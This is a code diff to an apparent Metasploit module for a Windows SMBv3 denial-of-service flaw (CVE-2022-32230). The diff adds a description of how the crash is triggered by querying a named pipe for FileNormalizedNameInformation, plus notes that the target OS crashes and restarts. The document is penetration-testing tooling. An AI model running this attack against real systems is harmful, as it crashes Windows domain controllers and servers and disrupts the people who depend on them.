@@ -13,7 +13,11 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'SMBv3 FileNormalizedNameInformation NULL-ptr Dereference',
         'Description' => %q{
           A remote and unauthenticated attacker can trigger a denial of service condition on Microsoft Windows Domain
-          Controllers by leveraging a flaw that leads to a null pointer deference within the Windows kernel.
+          Controllers by leveraging a flaw that leads to a null pointer deference within the Windows kernel. The same
+          vulnerability can be triggered on systems that are not Domain Controllers when authenticated. The
+          vulnerability is triggered by opening a named pipe and then querying it for FileNormalizedNameInformation.
+          Access to a named pipe is why domain controllers can exploited anonymously while other systems require
+          authentication. This vulnerability was patched in April 2022.
         },
         'Author' => [ 'Spencer McIntyre' ],
         'License' => MSF_LICENSE,
@@ -24,7 +28,12 @@ class MetasploitModule < Msf::Auxiliary
         'References' => [
           [ 'CVE', '2022-32230' ],
         ],
-        'DisclosureDate' => '2022-06-14'
+        'DisclosureDate' => '2022-06-14',
+        'Notes' => {
+          'Stability' => [ CRASH_OS_RESTARTS ],
+          'SideEffects' => [ SCREEN_EFFECTS ], # the BSOD is visible on the screen
+          'Reliability' => [] # the DoS is reliable, but no payload is executed
+        }
       )
     )
 
@@ -68,6 +77,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       @tree.client.send_recv(query_request, encrypt: @tree.tree_connect_encrypt_data)
     rescue RubySMB::Error::CommunicationError
+      vprint_status('Received a communication error which indicates the service has crashed')
     end
   end
 end
